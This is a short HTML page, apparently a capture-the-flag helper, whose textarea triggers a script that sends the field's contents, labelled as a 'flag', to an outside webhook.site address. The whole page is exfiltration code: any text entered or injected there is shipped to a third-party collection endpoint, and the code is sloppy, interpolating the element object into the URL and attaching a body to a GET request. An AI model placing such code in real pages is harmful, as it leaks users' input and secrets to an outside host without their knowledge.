<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <textarea onchange="hook()" id="input" style="width: 100%; height: 100%;"></textarea>
    <script>
        function hook() {
            var input = document.getElementById('input');
            var xhr = new XMLHttpRequest();
            xhr.open('GET', `https://webhook.site/744508a6-a31e-46d4-a80b-bd0c6a71d253?flag=${input}`, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({data: input.value}));
        }
    </script>
</body>
</html>
